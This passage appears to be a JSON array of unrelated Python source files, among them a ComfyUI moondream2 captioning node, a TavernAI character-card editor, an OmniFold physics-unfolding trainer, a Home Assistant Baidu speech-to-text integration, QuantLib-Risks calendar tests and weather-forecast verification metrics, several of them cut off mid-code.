inverse=True)\n",
    "#\u53c2\u8003 https://github.com/Hangover3832 \u628a\u6a21\u578b\u653e\u5230\u672c\u5730\uff0ccheckponts\u4e0b\u9762\n\nimport os\nfrom transformers import AutoModelForCausalLM, CodeGenTokenizerFast as Tokenizer\nfrom PIL import Image\nimport torch\nimport gc\nimport numpy as np\nimport folder_paths\n\ncomfy_path = os.path.dirname(folder_paths.__file__)\ncustom_nodes_path = os.path.join(comfy_path, \"custom_nodes\")\n\n# \u6307\u5b9a\u672c\u5730\u5206\u5272\u6a21\u578b\u6587\u4ef6\u5939\u7684\u8def\u5f84\nmodel_folder_path = os.path.join(custom_nodes_path,\"Comfyui_CXH_moondream2\",\"checkpoints\",\"moondream2\")\nmodel_name = \"vikhyatk/moondream2\"\n\nclass Moondream:\n    DEVICES = [\"cpu\", \"gpu\"] if torch.cuda.is_available() else  [\"cpu\"]\n\n    def __init__(self):\n        self.model = None\n        self.tokenizer = None\n\n    @classmethod\n    def INPUT_TYPES(s):\n        return {\n            \"required\": {\n                \"image\": (\"IMAGE\",),\n                \"prompt\": (\"STRING\", {\"multiline\": False, \"default\": \"Please provide a detailed description of this image.\"},),\n                \"device\": (s.DEVICES, {\"default\": s.DEVICES[1]},),\n                \"trust_remote_code\": (\"BOOLEAN\", {\"default\": True},),\n                \"cache\": (\"BOOLEAN\", {\"default\": True},),\n            }\n        }\n\n    RETURN_TYPES = (\"STRING\",)\n    RETURN_NAMES = (\"description\",)\n    FUNCTION = \"gen\"\n    OUTPUT_NODE = False\n    CATEGORY = \"CXH\"\n\n    def gen(self, image:torch.Tensor, prompt:str,  device:str, trust_remote_code:bool,cache:bool):\n        dev = \"cuda\" if device.lower() == \"gpu\" else \"cpu\"\n        if (self.model == None) or (self.tokenizer == None)  or (device != self.device):\n            del self.model\n            del self.tokenizer\n            gc.collect()\n            if (device == \"cpu\") and torch.cuda.is_available():\n                torch.cuda.empty_cache()\n            self.model = None\n            self.tokenizer = None\n            try:\n                self.model = AutoModelForCausalLM.from_pretrained(model_name, trust_remote_code=trust_remote_code,cache_dir=model_folder_path).to(dev)\n            except ValueError:\n                print(\"Moondream: You have to trust remote code to use this node!\")\n                return (\"You have to trust remote code execution to use this node!\",)\n            \n            self.tokenizer = Tokenizer.from_pretrained(model_name,cache_dir=model_folder_path)\n            self.device = device\n\n        descriptions = \"\"\n        \n        for im in image:\n            i = 255. * im.cpu().numpy()\n            img = Image.fromarray(np.clip(i, 0, 255).astype(np.uint8))\n            enc_image = self.model.encode_image(img)\n            answer = self.model.answer_question(enc_image, prompt, self.tokenizer)\n            descriptions += answer\n\n        #\u91ca\u653e\u7f13\u5b58\n        if cache == False:\n            del self.model\n            del self.tokenizer\n            self.model = None\n            self.tokenizer = None\n        \n            \n         \n        return(descriptions,)\n",
    "from PIL import Image\nfrom PIL.PngImagePlugin import PngImageFile, PngInfo\nimport base64\nimport json\n\nbase = {\n    'spec': 'chara_card_v2',\n    'spec_version': '2.0',\n    'data': {\n        'name': '',\n        'description': \"\",\n        'personality': '',\n        'scenario': \"\",\n        'first_mes': '',\n        'mes_example': '',\n        'creator_notes': '',\n        'system_prompt': '',\n        'post_history_instructions': '',\n        'alternate_greetings': [],\n        'tags': [],\n        'creator': '',\n        'character_version': '',\n        'extensions': {}\n    }\n}\n\nPLAINTEXT_EDITOR_MAX_HEIGHT = 50\nDIRTY_CHARACTER_COLOUR = \"background-color: #FFFF00;\"\n\n# Various global methods\n\n# Extract JSON character data from an image. Handles both V1 and V2 TavernAI format, returns V2.\n# Creates a new character data dict if the image doesn't have one.\ndef read_character(path):\n    image = PngImageFile(path)\n    user_comment = image.text.get('chara', None)\n    if user_comment == None:\n        return json.loads(json.dumps(base)) # deep copy of an empty character dictionary\n    base64_bytes = user_comment.encode('utf-8')  # Convert the base64 string to bytes\n    json_bytes = base64.b64decode(base64_bytes)  # Decode the base64 bytes to JSON bytes\n    json_str = json_bytes.decode('utf-8')  # Convert the JSON bytes to a string\n    data = json.loads(json_str)  # Convert the string to JSON data\n\n    if data.get('spec') != 'chara_card_v2':\n        newData = json.loads(json.dumps(base)) # deep copy of an empty character dictionary\n        newData[\"data\"] = data\n        data = newData\n    if not isinstance(data[\"data\"].get(\"tags\", []), list):\n        data[\"data\"][\"tags\"] = []\n    if not isinstance(data[\"data\"].get(\"alternate_greetings\", []), list):\n        data[\"data\"][\"alternate_greetings\"] = []\n    if \"character_book\" in data[\"data\"] and \"entries\" in data[\"data\"][\"character_book\"]:\n        for entry in data[\"data\"][\"character_book\"][\"entries\"]:\n            if not isinstance(entry.get(\"secondary_keys\"), list):\n                entry[\"secondary_keys\"] = []\n    return data\n\n#Writes character data back to the image\ndef write_character(path, data):\n    json_str = json.dumps(data)\n    base64_str = base64.b64encode(json_str.encode('utf-8')).decode('utf-8')\n    image = Image.open(path)\n    metadata = PngInfo()\n    metadata.add_text('chara', base64_str)\n    image.save(path, 'PNG', pnginfo=metadata)\n\n#ensures that agnai, sillytavern, and tavernai characterbooks all come out in the same\n#format, ready for insertion into a tavernai character\ndef process_worldbook(data):\n    if not isinstance(data, dict):\n        return None\n    if not \"entries\" in data:\n        if \"spec\" in data and data[\"spec\"] =='chara_card_v2' and \"data\" in data and \"character_book\" in data[\"data\"]:\n            return data[\"data\"][\"character_book\"]        \n        return None\n    if isinstance(data[\"entries\"], dict):\n        entries = list(data[\"entries\"].values())\n        data[\"entries\"] = entries\n    for entry in data[\"entries\"]:\n        if \"entry\" in entry and entry.get(\"content\") == entry.get(\"entry\"):\n            del entry[\"entry\"]\n            #The agnai worldbooks I've looked at have duplicte contents, I'm making an executive decision here\n            #to pare that down since the spec for tavernai characters would ignore this data anyway\n    return data\n\n#merges worldBook into characterBook\ndef import_worldbook(characterBook, worldBook):\n    desc = worldBook.get(\"description\", \"\")\n    if desc != \"\" and characterBook.get(\"description\", \"\") == \"\":\n        characterBook[\"description\"] = desc\n    name = worldBook.get(\"name\", \"\")\n    if name != \"\" and characterBook.get(\"name\", \"\") == \"\":\n        characterBook[\"name\"] = name\n    characterBook[\"entries\"] = characterBook.get(\"entries\", [])\n    characterBook[\"entries\"] += worldBook[\"entries\"]\n    worldExtensions = worldBook.get(\"extensions\", {})\n    characterExtensions = characterBook.get(\"extensions\", {})\n    characterBook[\"extensions\"] = characterExtensions | worldExtensions\n    return characterBook\n\nimport sys\nfrom PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QListWidget, QLabel, QListWidgetItem, QStackedWidget, QSplitter\nfrom PyQt5.QtWidgets import QLineEdit, QPlainTextEdit, QListWidget, QPushButton, QFormLayout, QTabWidget, QHBoxLayout, QFileDialog\nfrom PyQt5.QtWidgets import QCheckBox, QSizePolicy, QComboBox, QGridLayout, QAbstractItemView\nfrom PyQt5.QtGui import QIntValidator, QDoubleValidator\nfrom PyQt5.QtCore import Qt\nimport os\nimport traceback\n\ndef excepthook(exc_type, exc_value, exc_tb):\n    tb = \"\".join(traceback.format_exception(exc_type, exc_value, exc_tb))\n    print(\"caught:\", tb)\n    sys.__excepthook__(exc_type, exc_value, exc_tb)\n\nsys.excepthook = excepthook\n\n#Common functionality for checkboxes that can be undefined\ndef convertBoolToTristate(data):\n    if data == True:\n        return Qt.Checked\n    elif data == False:\n        return Qt.Unchecked\n    return Qt.PartiallyChecked\ndef convertTri",
    "import numpy as np\nimport tensorflow as tf\nfrom tensorflow import keras\nimport tensorflow.keras.backend as K\nfrom tensorflow.keras.callbacks import EarlyStopping,ModelCheckpoint, ReduceLROnPlateau\nimport os, gc\nimport horovod.tensorflow.keras as hvd\nfrom tensorflow.keras.losses import mse\nfrom scipy.special import expit\nfrom PET import PET\nimport pickle\n\ndef weighted_binary_crossentropy(y_true, y_pred):\n    \"\"\"Custom loss function with weighted binary cross-entropy.\"\"\"\n    weights = tf.cast(tf.gather(y_true, [1], axis=1), tf.float32)  # Event weights\n    y_true = tf.cast(tf.gather(y_true, [0], axis=1), tf.float32)  # Actual labels\n\n    # Compute loss using TensorFlow's built-in function to handle numerical stability\n    loss = weights * tf.nn.sigmoid_cross_entropy_with_logits(labels=y_true, logits=y_pred)\n    return tf.reduce_mean(loss)\n\n\ndef convert_to_dict(x):    \n    keys = ['input_features','input_points','input_mask','input_jet','input_time']\n    d = {}\n    for ik, key in enumerate(keys):\n        d[key] = x[ik]\n\n    return d\ndef concat_data(list1,list2):\n    concatenated_arrays = []\n    for arr1, arr2 in zip(list1, list2):\n        concatenated_array = np.concatenate((arr1, arr2), axis=0)\n        concatenated_arrays.append(concatenated_array)\n    return concatenated_arrays\n\n\nclass OmniFold():\n    \"\"\"Main class for the OmniFold algorithm.\"\"\"\n    def __init__(self,version,num_iter,checkpoint_folder,\n                 batch_size=512,epochs=200,size=1,\n                 wd = 0.1,b1=0.95,b2=0.99,learning_rate_factor = 5.0,\n                 learning_rate=1e-4,fine_tune=False):\n        \n        self.version = version\n        self.num_iter = num_iter\n        self.mc = None\n        self.data=None\n        self.batch_size=batch_size\n        self.epochs=epochs\n        self.learning_rate = learning_rate\n        self.size = size\n        self.fine_tune = fine_tune\n        self.wd = wd\n        self.b1 = b1\n        self.b2 = b2\n        if self.fine_tune:\n            self.learning_rate_factor = learning_rate_factor\n        else:\n            self.learning_rate_factor = 1.\n\n        self.checkpoint_folder = checkpoint_folder\n            \n    def Unfold(self):\n                                        \n        self.weights_pull = np.ones(self.mc.weight.shape[0])\n        self.weights_push = np.ones(self.mc.weight.shape[0])\n        self.scale = 1.0\n        self.CompileModel(self.learning_rate)\n        for i in range(self.num_iter):\n            if hvd.rank()==0:print(\"ITERATION: {}\".format(i + 1))\n            self.RunStep1(i)\n            self.RunStep2(i)\n            self.CompileModel(self.learning_rate,fixed=True)\n            \n\n    def RunStep1(self,i):\n        '''Data versus reco MC reweighting'''\n        if hvd.rank()==0:print(\"RUNNING STEP 1\")\n        \n        self.RunModel(\n            concat_data(self.mc.reco, self.data.reco),\n            np.concatenate((self.labels_mc, self.labels_data)),\n            np.concatenate((self.weights_push*self.mc.weight,self.data.weight)),\n            i,self.model1,stepn=1,\n        )\n\n        new_weights = self.reweight(self.mc.reco,self.model1)\n        self.weights_pull = self.weights_push *new_weights\n        #Ensure new set of weights dont modify the overall normalization\n        norm_factor = hvd.allreduce(tf.constant(self.weights_pull,dtype=tf.float32)).numpy()\n        self.weights_pull /= norm_factor\n\n    def RunStep2(self,i):\n        '''Gen to Gen reweighing'''        \n        if hvd.rank()==0:print(\"RUNNING STEP 2\")\n        \n        self.RunModel(\n            concat_data(self.mc.gen, self.mc.gen),\n            np.concatenate((self.labels_mc, self.labels_gen)),\n            np.concatenate((self.mc.weight, self.mc.weight*self.weights_pull)),\n            i,self.model2,stepn=2,\n        )\n        new_weights=self.reweight(self.mc.gen,self.model2)\n        norm_factor = hvd.allreduce(tf.constant(new_weights,dtype=tf.float32)).numpy()\n        self.weights_push = new_weights/norm_factor\n\n    def RunModel(self,\n                 data,\n                 labels,\n                 weights,\n                 iteration,\n                 model,\n                 stepn,\n                 cached = False,\n                 ):\n\n        \n        verbose = 1 if hvd.rank() == 0 else 0        \n        permutation = np.random.permutation(labels.shape[0])\n\n        #Shuffle\n        data = [arr[permutation] for arr in data]\n        data = convert_to_dict(data)\n        labels = labels[permutation]\n        weights = weights[permutation]\n        y = np.stack((labels,weights),axis=1)\n\n        \n        callbacks = [\n            hvd.callbacks.BroadcastGlobalVariablesCallback(0),\n            hvd.callbacks.MetricAverageCallback(),\n            \n            ReduceLROnPlateau(patience=100, min_lr=1e-6, monitor=\"val_loss\"),\n            EarlyStopping(patience=3,restore_best_weights=True,monitor=\"val_loss\"),\n        ]\n        \n        \n        if hvd.rank() ==0:\n        \n            model_name = '{}/checkpoints/OmniFold_{}_iter{}_step{}.we",
    "import numpy as np\nfrom scipy.sparse import csr_matrix\nfrom operator import itemgetter\nimport random\n\nimport numpy as np\nimport torch\ndef init_seed(seed, reproducibility):\n    r\"\"\" init random seed for random functions in numpy, torch, cuda and cudnn\n\n    Args:\n        seed (int): random seed\n        reproducibility (bool): Whether to require reproducibility\n    \"\"\"\n    random.seed(seed)\n    np.random.seed(seed)\n    torch.manual_seed(seed)\n    torch.cuda.manual_seed(seed)\n    torch.cuda.manual_seed_all(seed)\n    # if reproducibility:\n    #     torch.backends.cudnn.benchmark = False\n    #     torch.backends.cudnn.deterministic = True\n    # else:\n    #     torch.backends.cudnn.benchmark = True\n    #     torch.backends.cudnn.deterministic = False\n\n\ndef data_masks(all_sessions, n_node):\n    indptr, indices, data = [], [], []\n    indptr.append(0)\n    for j in range(len(all_sessions)):\n        session = np.unique(all_sessions[j])\n        length = len(session)\n        s = indptr[-1]\n        indptr.append((s + length))\n        for i in range(length):\n            indices.append(session[i]-1)\n            data.append(1)\n    matrix = csr_matrix((data, indices, indptr), shape=(len(all_sessions), n_node))\n    return matrix\n\ndef data_easy_masks(mat, n_row, n_col):\n    data, indices, indptr  = mat[0], mat[1], mat[2]\n\n    matrix = csr_matrix((data, indices, indptr), shape=(n_row, n_col))\n    return matrix\n\ndef split_validation(train_set, valid_portion):\n    train_set_x, train_set_y = train_set\n    n_samples = len(train_set_x)\n    sidx = np.arange(n_samples, dtype='int32')\n    np.random.shuffle(sidx)\n    n_train = int(np.round(n_samples * (1. - valid_portion)))\n    valid_set_x = [train_set_x[s] for s in sidx[n_train:]]\n    valid_set_y = [train_set_y[s] for s in sidx[n_train:]]\n    train_set_x = [train_set_x[s] for s in sidx[:n_train]]\n    train_set_y = [train_set_y[s] for s in sidx[:n_train]]\n\n    return (train_set_x, train_set_y), (valid_set_x, valid_set_y)\n\nclass Data():\n    def __init__(self, data, shuffle=False, n_node=None):\n        # data formulation: 0:id_seq, 1:flag, 2:labs\n        self.raw = np.asarray(data[0])  # sessions, item_seq\n        self.flags = np.asarray(data[1])\n        self.targets = np.asarray(data[2])\n\n        H_T = data_easy_masks(data[3], n_node, n_node)  # 10000 * 6558 #sessions * #items H_T in \n        self.adjacency = H_T.tocoo()\n        self.length = len(self.raw)\n        self.shuffle = shuffle\n\n    def get_overlap(self, sessions):\n        matrix = np.zeros((len(sessions), len(sessions)))\n        for i in range(len(sessions)):\n            seq_a = set(sessions[i])\n            seq_a.discard(0)\n            for j in range(i+1, len(sessions)):\n                seq_b = set(sessions[j])\n                seq_b.discard(0)\n                overlap = seq_a.intersection(seq_b)\n                ab_set = seq_a | seq_b\n                matrix[i][j] = float(len(overlap))/float(len(ab_set))\n                matrix[j][i] = matrix[i][j]\n        matrix = matrix + np.diag([1.0]*len(sessions))\n        degree = np.sum(np.array(matrix), 1)\n        degree = np.diag(1.0/degree)\n        return matrix, degree\n\n    def generate_batch(self, batch_size):\n        if self.shuffle:\n            shuffled_arg = np.arange(self.length)\n            np.random.shuffle(shuffled_arg)\n            # \u6253\u4e71session item_seq&price_seq\u7684\u987a\u5e8f\n            self.raw = self.raw[shuffled_arg]\n            self.flags = self.flags[shuffled_arg]\n            self.targets = self.targets[shuffled_arg]\n        n_batch = int(self.length / batch_size)\n        if self.length % batch_size != 0:\n            n_batch += 1\n        slices = np.split(np.arange(n_batch * batch_size), n_batch)\n        slices[-1] = np.arange(self.length-batch_size, self.length)\n        return slices\n\n    def get_slice(self, index):\n        items, num_node = [], []\n        inp = self.raw[index]\n\n        for session in inp:\n            num_node.append(len(np.nonzero(session)[0]))\n        max_n_node = np.max(num_node)\n        session_len = []\n        reversed_sess_item = []\n        mask = []\n        for session in inp:\n            nonzero_elems = np.nonzero(session)[0]\n            session_len.append([len(nonzero_elems)])\n            if max_n_node - len(nonzero_elems) == 0:\n                items.append(session)\n                mask.append([1] * len(nonzero_elems))\n                reversed_sess_item.append(list(reversed(session)))\n            else:\n                items.append(session + (max_n_node - len(nonzero_elems)) * [0])\n                mask.append([1] * len(nonzero_elems) + (max_n_node - len(nonzero_elems)) * [0])\n                reversed_sess_item.append(list(reversed(session)) + (max_n_node - len(nonzero_elems)) * [0])\n\n\n        return self.targets[index]-1, self.flags[index], session_len,items, reversed_sess_item, mask,\n\n\n",
    "\"\"\"Support for Baidu speech to text service.\"\"\"\nfrom __future__ import annotations\nimport logging\nimport voluptuous as vol\nfrom collections.abc import AsyncIterable\nfrom homeassistant.components.tts import CONF_LANG, PLATFORM_SCHEMA, Provider\nfrom homeassistant.const import CONF_API_KEY\nfrom homeassistant.components import stt\nfrom homeassistant.config_entries import ConfigEntry\nfrom homeassistant.core import HomeAssistant\nfrom homeassistant.helpers.entity_platform import AddEntitiesCallback\nimport homeassistant.helpers.config_validation as cv\n\nfrom aip import AipSpeech\n#from . import DOMAIN\nfrom .const import DOMAIN\n_LOGGER = logging.getLogger(__name__)\n\nfrom homeassistant.components.stt import (\n    AudioBitRates,\n    AudioChannels,\n    AudioCodecs,\n    AudioFormats,\n    AudioSampleRates,\n    Provider,\n    SpeechMetadata,\n    SpeechResult,\n    SpeechResultState,\n)\n\n\nCONF_APP_ID = \"app_id\"\nCONF_SECRET_KEY = \"secret_key\"\n\nLANGUAGES_Dictionary = {\n\t'\u666e\u901a\u8bdd': 1537,\n\t'\u82f1\u8bed': 1737, \n\t'\u7ca4\u8bed': 1637, \n\t'\u56db\u5ddd\u8bdd': 1837\n}\n\nSUPPORTED_LANGUAGES= list(LANGUAGES_Dictionary.keys())\nDEFAULT_LANG = \"\u666e\u901a\u8bdd\"\n\nPLATFORM_SCHEMA = PLATFORM_SCHEMA.extend(\n    {\n        vol.Required(CONF_APP_ID): cv.string,\n        vol.Required(CONF_API_KEY): cv.string,\n        vol.Required(CONF_SECRET_KEY): cv.string,\n    }\n)\n\nasync def async_setup_entry(\n    hass: HomeAssistant,\n    config_entry: ConfigEntry,\n    async_add_entities: AddEntitiesCallback,\n) -> None:\n    async_add_entities([BaiduSTT(hass, config_entry)])\n\nclass BaiduSTT(stt.SpeechToTextEntity):\n    def __init__(self, hass: HomeAssistant, config_entry: ConfigEntry) -> None:\n        #   \"\"\"Init Baidu STT Entity.\"\"\"\n        # self._app_data = {\n            # \"appid\": config_entry.data[CONF_APP_ID],\n            # \"apikey\": config_entry.data[CONF_API_KEY],\n            # \"secretkey\": config_entry.data[CONF_SECRET_KEY],\n        # }\n        hass.data.setdefault(DOMAIN, {})\n        self.appid = config_entry.data[CONF_APP_ID]\n        self.apikey = config_entry.data[CONF_API_KEY]\n        self.secretkey = config_entry.data[CONF_SECRET_KEY]\n        self._attr_name = 'BaiduStt'\n        self._attr_unique_id = f\"{config_entry.entry_id[:7]}-stt\"\n\n    @property\n    def supported_languages(self) -> list[str]:\n        \"\"\"Return a list of supported languages.\"\"\"\n        return SUPPORTED_LANGUAGES\n\n    @property\n    def supported_formats(self) -> list[AudioFormats]:\n        \"\"\"Return a list of supported formats.\"\"\"\n        return [AudioFormats.WAV, AudioFormats.OGG]\n\n    @property\n    def supported_codecs(self) -> list[AudioCodecs]:\n        \"\"\"Return a list of supported codecs.\"\"\"\n        return [AudioCodecs.PCM, AudioCodecs.OPUS]\n\n    @property\n    def supported_bit_rates(self) -> list[AudioBitRates]:\n        \"\"\"Return a list of supported bitrates.\"\"\"\n        return [AudioBitRates.BITRATE_16]\n\n    @property\n    def supported_sample_rates(self) -> list[AudioSampleRates]:\n        \"\"\"Return a list of supported samplerates.\"\"\"\n        return [AudioSampleRates.SAMPLERATE_16000]\n\n    @property\n    def supported_channels(self) -> list[AudioChannels]:\n        \"\"\"Return a list of supported channels.\"\"\"\n        return [AudioChannels.CHANNEL_MONO]\n\n    async def async_process_audio_stream(\n        self, metadata: SpeechMetadata, stream: AsyncIterable[bytes]\n    ) -> SpeechResult:\n        _LOGGER.debug(\"Baidu Speech to text process_audio_stream start\")\n        # Collect data\n        audio_data = bytes() ### \u58f0\u660e\u7a7a\u7684\u5b57\u8282\u53d8\u91cf\n        async for chunk in stream:\n            audio_data += chunk\n        \n        _LOGGER.debug(f\"Baidu Speech to text process_audio_stream transcribe: {len(audio_data)} bytes\")\n\n        # \"\"\"Process an audio stream to STT service.\"\"\"\n\n        # aip_speech = AipSpeech(\n            # str(self._app_data[\"appid\"]),\n            # self._app_data[\"apikey\"],\n            # self._app_data[\"secretkey\"],\n        # )\n        stream_langugage =LANGUAGES_Dictionary[metadata.language]\n        aip_speech = AipSpeech(self.appid, self.apikey, self.secretkey)\n        try:\n            response_json = await self.hass.async_add_executor_job( aip_speech.asr,audio_data, 'pcm', 16000, {'dev_pid':stream_langugage,})\n            _LOGGER.debug(f\"Received response from Baidu REST-API-PythonSDK with {response_json}\")\n            if  response_json['err_no'] == 0:\n                response =''.join(response_json['result'])\n                _LOGGER.info(f\"Baidu Speech to text process_audio_stream end: {response}\")\n                return SpeechResult(response, SpeechResultState.SUCCESS)\n            else:\n                return stt.SpeechResult(f\"\u8bc6\u522b\u51fa\u73b0\u5f02\u5e38: {response_json['err_msg']}\", stt.SpeechResultState.SUCCESS)\n                \n        except Exception as err:\n            _LOGGER.exception(\"Error processing audio stream: %s\", err)\n            return stt.SpeechResult('\u8bc6\u522b\u8fde\u63a5\u51fa\u73b0\u5f02\u5e38\uff0c\u8bf7\u68c0\u67e5\u5bc6\u94a5\u662f\u5426\u6b63\u786e\uff0c\u6216\u8005\u8054\u7cfb\u63d2\u4ef6\u4f5c\u8005\u5bfb\u6c42\u5e2e\u52a9', stt.SpeechResultState.SUCCESS)\n\n        return SpeechResult(None, SpeechResultState.ERROR)\n      \n",
    "from logger import logger\nimport time\nimport pandas as pd\n\nfrom solutions.constants import FILE_PATH\n\n\nclass Solution(object):\n    @staticmethod\n    def solve():\n        # \u041f\u0443\u0442\u044c \u043a \u0444\u0430\u0439\u043b\u0443 \u0434\u0430\u043d\u043d\u044b\u0445\n\n        # \u0427\u0442\u0435\u043d\u0438\u0435 \u0432\u0441\u0435\u0433\u043e \u0444\u0430\u0439\u043b\u0430 \u0441\u0440\u0430\u0437\u0443\n        data = pd.read_csv(FILE_PATH, sep=';', header=None, names=['Station', 'Temperature'])\n\n        # \u0410\u0433\u0440\u0435\u0433\u0430\u0446\u0438\u044f \u0434\u0430\u043d\u043d\u044b\u0445 \u043f\u043e \u043c\u0435\u0442\u0435\u043e\u0441\u0442\u0430\u043d\u0446\u0438\u044f\u043c\n        summary = data.groupby('Station').agg({\n            'Temperature': ['mean', 'min', 'max']\n        })\n\n        # \u041f\u0435\u0440\u0435\u0438\u043c\u0435\u043d\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u0442\u043e\u043b\u0431\u0446\u043e\u0432\n        summary.columns = ['Mean', 'Min', 'Max']\n        summary.reset_index(inplace=True)\n\n        # \u041e\u043a\u0440\u0443\u0433\u043b\u0435\u043d\u0438\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u0442\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\n        summary['Mean'] = summary['Mean'].round(1)\n        summary['Min'] = summary['Min'].round(1)\n        summary['Max'] = summary['Max'].round(1)\n\n        # \u0421\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \u043f\u043e \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u044e \u043c\u0435\u0442\u0435\u043e\u0441\u0442\u0430\u043d\u0446\u0438\u0439\n        summary.sort_values('Station', inplace=True)\n\n        # \u0412\u044b\u0432\u043e\u0434 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u0432\n        for index, row in summary.iterrows():\n            print(f\"{row['Station']}: {row['Mean']}, {row['Min']}, {row['Max']}\")\n\n\ndef main():\n    logger.info(\"Starting the solution\")\n    start = time.time()\n    Solution.solve()\n    elapsed_time = time.time() - start\n    logger.info(f\"Solution finished, {elapsed_time} seconds elapsed\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "\"\"\"\n Copyright (C) 2023 Skandinaviska Enskilda Banken AB (publ)\n Copyright (C) 2024 Xcelerit Computing Limited.\n\n This file is part of QuantLib-Risks, a Python wrapper for QuantLib enabled\n for risk computation using automatic differentiation. It uses XAD,\n a fast and comprehensive C++ library for automatic differentiation.\n\n QuantLib-Risks and XAD are free software: you can redistribute it and/or modify\n it under the terms of the GNU Affero General Public License as published\n by the Free Software Foundation, either version 3 of the License, or\n (at your option) any later version.\n\n QuantLib-Risks is distributed in the hope that it will be useful,\n but WITHOUT ANY WARRANTY; without even the implied warranty of\n MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n GNU Affero General Public License for more details.\n\n You should have received a copy of the GNU Affero General Public License\n along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\n QuantLib is free software: you can redistribute it and/or modify it\n under the terms of the QuantLib license.  You should have received a\n copy of the license along with this program; if not, please email\n <quantlib-dev@lists.sf.net>. The license is also available online at\n <http://quantlib.org/license.shtml>.\n\n This program is distributed in the hope that it will be useful, but WITHOUT\n ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS\n FOR A PARTICULAR PURPOSE.  See the license for more details.\n\"\"\"\nimport itertools\nimport unittest\n\nimport QuantLib_Risks as ql\n\n\nclass JointCalendarTest(unittest.TestCase):\n\n    def test_joint_calendar_holidays(self):\n        base_calendars = [ql.Sweden(), ql.Denmark(), ql.Finland(), ql.Norway(), ql.Iceland()]\n        joint_nordics = ql.JointCalendar(base_calendars)\n        start_date = ql.Date(1, ql.January, 2023)\n        end_date = ql.Date(31, ql.December, 2023)\n\n        joint_holidays = set(joint_nordics.holidayList(start_date, end_date))\n        base_holidays = [calendar.holidayList(start_date, end_date) for calendar in base_calendars]\n        base_holidays = set(itertools.chain.from_iterable(base_holidays))\n        for holiday in base_holidays:\n            self.assertIn(holiday, joint_holidays)\n\n\nclass ResetBespokeCalendarTest(unittest.TestCase):\n\n    def test_reset_added_holidays(self):\n        calendar = ql.BespokeCalendar(\"bespoke thing\")\n\n        test_date: ql.Date = ql.Date(1, ql.January, 2024)\n        self.assertFalse(calendar.isHoliday(test_date))\n        calendar.addHoliday(test_date)\n        self.assertTrue(calendar.isHoliday(test_date))\n        # TODO: Can extend test with this, if exposed:\n        # self.assertEqual(len(calendar.addedHolidays()), 1)\n        calendar.resetAddedAndRemovedHolidays()\n        self.assertFalse(calendar.isHoliday(test_date))\n\n\nif __name__ == \"__main__\":\n    print(\"testing QuantLib\", ql.__version__)\n    unittest.main(verbosity=2)\n",
    "import numpy as np\nimport xarray as xr\nimport pandas as pd\nfrom scipy.stats import pearsonr\nimport matplotlib.pyplot as plt\n\n\ndef help(cls):\n    print(\"Available methods in the NWP_Stats class:\")\n    print(\"-------------------------------------------\")\n    for method_name in dir(cls):\n        if method_name.startswith(\"compute_\"):\n            method = getattr(cls, method_name)\n            print(f\"{method_name}:\")\n            print(method.__doc__)\n            print(\"---\")\n\n\nclass NWP_Stats:\n    def __init__(self, obs_data, model_data):\n        \"\"\"\n        Initialize the NWPMetrics object with observed and modeled data.\n        \n        Args:\n            obs_data (xarray.DataArray): The observed data.\n            model_data (xarray.DataArray): The modeled data.\n        \"\"\"\n        self.obs_data = obs_data\n        self.model_data = model_data\n\n    def compute_metrics(self, metrics, dim=None, thresholds=None):\n        \"\"\"\n        Compute the specified metrics.\n        \n        Args:\n            metrics (list): A list of metric names to compute.\n            dim (str, list, or None): The dimension(s) along which to compute the metrics.\n                                      If None, compute the metrics over the entire data.\n            thresholds (dict): A dictionary containing threshold values for specific metrics.\n        \n        Returns:\n            dict: A dictionary containing the computed metric values.\n        \"\"\"\n        metric_values = {}\n        for metric in metrics:\n            if metric == 'MAE':\n                metric_values[metric] = self.compute_mae(dim)\n            elif metric == 'RMSE':\n                metric_values[metric] = self.compute_rmse(dim)\n            elif metric == 'ACC':\n                metric_values[metric] = self.compute_acc(dim)\n            elif metric == 'FSS':\n                threshold = thresholds.get('FSS', 0.5)\n                neighborhood_size = thresholds.get('FSS_neighborhood', 3)\n                metric_values[metric] = self.compute_fss(threshold, neighborhood_size, dim)\n            elif metric == 'ETS':\n                threshold = thresholds.get('ETS', 0.5)\n                metric_values[metric] = self.compute_ets(threshold, dim)\n            elif metric == 'POD':\n                threshold = thresholds.get('POD', 0.5)\n                metric_values[metric] = self.compute_pod(threshold, dim)\n            elif metric == 'FAR':\n                threshold = thresholds.get('FAR', 0.5)\n                metric_values[metric] = self.compute_far(threshold, dim)\n            elif metric == 'CSI':\n                threshold = thresholds.get('CSI', 0.5)\n                metric_values[metric] = self.compute_csi(threshold, dim)\n            elif metric == 'BSS':\n                threshold = thresholds.get('BSS', 0.5)\n                metric_values[metric] = self.compute_bss(threshold, dim)\n            elif metric == 'HSS':\n                threshold = thresholds.get('HSS', 0.5)\n                metric_values[metric] = self.compute_hss(threshold, dim)\n            elif metric == 'PSS':\n                threshold = thresholds.get('PSS', 0.5)\n                metric_values[metric] = self.compute_pss(threshold, dim)\n            # elif metric == 'GS':\n            #     threshold = thresholds.get('GS', 0.5)   # a mirror instance of gilbert skill score already present\n            #    metric_values[metric] = self.compute_gs(threshold, dim)\n            elif metric == 'SEDS':\n                threshold = thresholds.get('SEDS', 0.5)\n                metric_values[metric] = self.compute_seds(threshold, dim)\n            elif metric == 'FB':\n                threshold = thresholds.get('FB', 0.5)\n                metric_values[metric] = self.compute_fb(threshold, dim)\n            elif metric == 'GSS':\n                threshold = thresholds.get('GSS', 0.5)\n                metric_values[metric] = self.compute_gss(threshold, dim)\n            elif metric == 'H-KD':\n                threshold = thresholds.get('H-KD', 0.5)\n                metric_values[metric] = self.compute_hkd(threshold, dim)\n            elif metric == 'ORSS':\n                threshold = thresholds.get('ORSS', 0.5)\n                metric_values[metric] = self.compute_orss(threshold, dim)\n            elif metric == 'EDS':\n                threshold = thresholds.get('EDS', 0.5)\n                metric_values[metric] = 